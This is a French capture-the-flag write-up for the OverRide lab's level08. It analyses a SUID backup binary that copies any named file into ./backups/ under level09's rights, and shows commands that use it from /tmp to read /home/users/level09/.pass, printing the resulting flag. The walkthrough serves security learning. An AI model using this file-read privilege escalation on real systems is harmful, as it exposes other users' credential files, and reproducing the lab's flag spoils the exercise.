# Level 08

### Étape 01: Analyse des permission du binaire
```bash
level08@OverRide:~$ ls -l level08
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
```

- On constate le "s" dans les permissions (SUID bit)
- Le "propriétaire" est level09
- Quand "level08" exécutes le programme, il s'exécute avec les privilèges de level09.

### Étape 02: Analyse rapide du code décompilé

```C
// Ligne 1: Ouvre le fichier qu'on choisit
__stream = fopen((char *)param_2[1],"r");

// Ligne 2: Construit le chemin de destination
local_78 = "./backups/"  // ici met le préfixe
strncat((char *)&local_78,(char *)param_2[1], ...);  // Puis il ajoute notre chemin

// Ligne 3: Crée le fichier de destination
__fd = open((char *)&local_78, 0xc1, 0x1b0);

// Ligne 4: Copie le contenu
while(true) {
    iVar2 = fgetc(__stream);  // Lit depuis le fichier source
    write(__fd,&local_79,1);   // Écrit dans la destination
}
```

### Étape 03: La faille identifiée
- Le programme:

	- Lit n'importe quel fichier qu'on lui donne (avec les droits de level09)
	- Crée une copie dans "./backups/" + notre chemin
	- Ne vérifie jamais si on a le droit de lire le fichier original

### Étape 04: Exploitation

```bash
cd /tmp # seul endroit ou on créer ("ou on a les permissions")
mkdir -p backups/home/users/level09 # on crée la structure de dossiers
````

```bash
~/level08 /home/users/level09/.pass # on exec le binaire avec le chemin du fichier cible depuis le tmp
````

```bash
# le prog crée depuis le fichier ou on l'execute donc "tmp/"
cat /tmp/backups/home/users/level09/.pass # on peut maintenat lire le flag
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

### Étape 05: Explications

- Le programme level08 (tournant avec les droits de level09) réussi à ouvrir /home/users/level09/.pass
- Il crée /tmp/backups/home/users/level09/.pass (dans notre dossier)
- Il copie le contenu dedans
- On peut lire la copie car elle nous "appartient"

- FLAG: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S